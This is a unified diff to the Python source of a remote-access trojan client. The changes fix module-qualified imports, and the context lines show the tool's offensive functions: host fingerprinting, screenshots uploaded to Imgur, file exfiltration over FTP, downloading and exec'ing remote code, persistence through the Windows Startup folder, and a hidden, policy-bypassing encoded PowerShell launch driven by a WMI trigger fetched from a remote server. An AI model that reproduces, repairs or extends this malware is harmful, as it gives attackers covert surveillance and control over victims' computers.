@@ -49,6 +49,7 @@ import time
 import json
 import struct
 import socket
+import zipfile
 import requests
 import tempfile
 import threading
@@ -323,11 +324,11 @@ class Client(object):
 
     # ------------------- private functions -------------------------
 
-    def _wget(self, target): return urlretrieve(target)[0] if target.startswith('http') else 'Error: target URL must begin with http:// or https://'
+    def _wget(self, target): return urllib.urlretrieve(target)[0] if target.startswith('http') else 'Error: target URL must begin with http:// or https://'
     
     def _cat(self, *path): return open(path[0]).read(4000) if os.path.isfile(path[0]) else 'Error: file not found'
     
-    def _unzip(self, *path): return ZipFile(*path).extractall('.') if os.path.isfile(path[0]) else 'Error: file not found'
+    def _unzip(self, *path): return zipfile.ZipFile(*path).extractall('.') if os.path.isfile(path[0]) else 'Error: file not found'
     
     def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
 
@@ -343,7 +344,7 @@ class Client(object):
   
     def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
-    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [requests.get('http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
+    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [requests.get('http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
 
     def _help(self, *arg): return ' \n USAGE\t\t\tDESCRIPTION\n --------------------------------------------------\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])
 
@@ -360,7 +361,7 @@ class Client(object):
 
     def _screenshot(self):
         tmp = tempfile.mktemp(suffix='.png')
-        with mss() as screen:
+        with mss.mss() as screen:
             img = screen.shot(output=tmp)
         result = self._upload_imgur(img)
         self._result['screenshot'].update({ time.ctime() : result })
@@ -518,10 +519,10 @@ class Client(object):
             encode = self._xor(vector, block)
             output = vector = self._encryption(encode)
             result.append(output)
-        return b64encode(''.join(result))
+        return base64.b64encode(''.join(result))
     
     def _decrypt(self, data):
-        blocks = self._block(b64decode(data))
+        blocks = self._block(base64.b64decode(data))
         result = []
         vector = blocks[0]
         for block in blocks[1:]:
@@ -659,7 +660,7 @@ class Client(object):
     def _new_module(self, uri, *kwargs):
         try:
             name = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
-            module = new_module(name)
+            module = imp.new_module(name)
             source = requests.get(uri).content
             code = compile(source, name, 'exec')
             exec code in module.__dict__
@@ -703,7 +704,7 @@ class Client(object):
         api_key = self.upload.options['imgur'].get('api_key')
         try:
             with open(filename, 'rb') as fp:
-                data = b64encode(fp.read())
+                data = base64.b64encode(fp.read())
             os.remove(filename)
             result = requests.post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
         except Exception as e:
@@ -734,7 +735,7 @@ class Client(object):
         if not self.upload.options['ftp'].get('host') or not self.upload.options['ftp'].get('username') or not self.upload.options['ftp'].get('password'):
             return 'Error: missing host/username/password'
         try:
-            host = FTP(self.upload.options['ftp'].get('host'), self.upload.options['ftp'].get('username'), self.upload.options['ftp'].get('password'))
+            host = ftplib.FTP(self.upload.options['ftp'].get('host'), self.upload.options['ftp'].get('username'), self.upload.options['ftp'].get('password'))
         except Exception as e:
             return 'FTP error: {}'.format(str(e))
         try:
@@ -1118,7 +1119,7 @@ class Client(object):
                 appdata = os.path.expandvars("%AppData%")
                 startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                 if os.path.exists(startup_dir):
-                    random_name = str().join([choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(choice(range(6,12)))])
+                    random_name = str().join([random.choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(random.choice(range(6,12)))])
                     startup_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
                     content = '\n[InternetShortcut]\nURL=file:///%s\n' % self._long_to_bytes(long(self.__f__))
                     with file(startup_file, 'w') as fp:
@@ -1178,7 +1179,7 @@ class Client(object):
                 if os.path.exists(filename):
                     cmd_line = 'start /b /min {}'.format(filename)
             elif command:
-                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
+                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(command.encode('UTF-16LE')))
             if len(cmd_line):
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
                 powershell = requests.get(self._long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
